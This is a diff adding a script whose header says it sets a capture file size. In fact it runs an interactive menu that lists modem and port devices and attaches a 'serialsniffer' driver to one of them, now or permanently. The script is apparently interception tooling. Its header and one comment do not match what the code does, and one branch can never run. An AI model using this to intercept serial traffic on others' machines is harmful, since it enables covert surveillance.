@@ -1,0 +1,155 @@
+#--------------------------------------------------------
+# File: SetMaxFileSize.eps
+#
+# Sets the maximum capture file size for DrillerSkyline tools
+#
+# Modifications:
+#  12/12/2006	Stole from DS
+#--------------------------------------------------------
+
+@echo off;
+
+if ($argc != 2) {
+    echo "Usage: $argv[0] <driverName>";
+    return false;
+}
+
+string $driver = $argv[1];
+
+# make sure it's not already installed
+ifnot (`regquery -hive L -subkey SYSTEM\\CurrentControlSet\\Services\\$driver`) {
+    echo "* $driver is not yet installed";
+    return false;
+}
+
+string $guidclasses;
+
+$guidclasses[0]  = "Return to main menu";
+$guidclasses[1]  = "modem";
+$guidclasses[2]  = "ports";
+#$guidclasses[3]  = "mouse";
+int $manual = sizeof($guidclasses);
+$guidclasses[$manual]  = "Enter a device name manually";
+
+while(true) {
+	echo "\r\n";
+	
+	echo "Choose a device class to connect to:";
+	int $i = 0;
+	while($i < sizeof($guidclasses)) {
+		if($i == $manual) {
+			echo "";
+		}
+		echo "($i). $guidclasses[$i]";
+		$i++;
+	}
+	
+	int $choice = GetInput("Attach to which device?");
+	
+	string $targetDevice;
+	if($choice == 0) {
+		return true;
+	} else if($choice == $manual) {
+		$targetDevice = GetInput("Enter the device path");
+	} else if($choice < $manual) {
+		# run devmgr and present the devices
+		GetDevice($targetDevice, $guidclasses[$choice]);
+	} else if($choice == $manual) {
+		$targetDevice = GetInput("Enter the full device name");
+	}
+	
+	if(defined($targetDevice)) {
+		echo "Attach to '$targetDevice'";
+		
+		if(prompt "Would you like to attach to the device immediately?") {
+#			@echo on;
+			bool $ret = `serialsniffer -driver $driver -attachNow "$targetDevice"`;
+#			@echo off;
+			if($ret) {
+				echo "    SUCCESS";
+			} else {
+				echo "    FAILED";
+			}
+		}
+		
+		if(prompt "Would you like to always attach to this device?") {
+#			@echo on;
+			bool $ret = `serialsniffer -driver $driver -attachAlways "$targetDevice"`;
+#			@echo off;
+			if($ret) {
+				echo "    SUCCESS";
+			} else {
+				echo "    FAILED";
+			}
+		}
+	}
+	
+	pause;
+}
+return false;
+
+sub GetDevice(REF string $targetDevice, IN string $class) {
+	bool $retVal;
+	int $offset = 0;
+	int $max = 4;
+	while(true) {
+		echo "";
+		echo "";
+		@record on;
+		$retVal = `devmgr -guidclass $class -offset $offset -max $max`;
+		@record off;
+		
+		ifnot($retVal) {
+			echo "Unable to get a list of potential devices";
+			return false;
+		}
+		
+		string $friend = GetCmdData("FriendlyName");
+		string $physObj = GetCmdData("PhysDevObjName");
+		
+		int $i = 0;
+		int $j = 0;
+		echo "(0). Return to previous menu";
+		while($i < sizeof($friend)) {
+			$j = $i;
+			$j++;
+			echo "($j). $friend[$i]";
+			$i++;
+		}
+		echo "   (Sometimes, the direct name won't work, but the device name might.)";
+		$i = 0;
+		int $phys = $j;
+		while($i < sizeof($friend)) {
+			$j = $i;
+			$j++;
+			$j += $phys;
+			echo "($j). Physical Object '$physObj[$i]' ($friend[$i])";
+			$i++;
+		}
+		$i++;
+		$i += $phys;
+		if($i > $max) {
+			echo "";
+			echo "($i). Get more devices";
+		}
+		
+		int $choice = GetInput("Attach to which device?");
+		
+		if($choice == 0) {
+			return false;
+		} else if($choice == $i && $i > $max) {
+			$offset += $max;
+		} else if($choice > 0 && $choice < $phys) {
+			$choice--;
+			
+			$targetDevice = "\\??\\$friend[$choice]";
+			return true;
+			
+		} else if( $choice > 0 && $choice < $i ) {
+			$choice--;
+			$choice -= $phys;
+			$targetDevice = $physObj[$choice];
+			return true;
+		}
+	}
+}
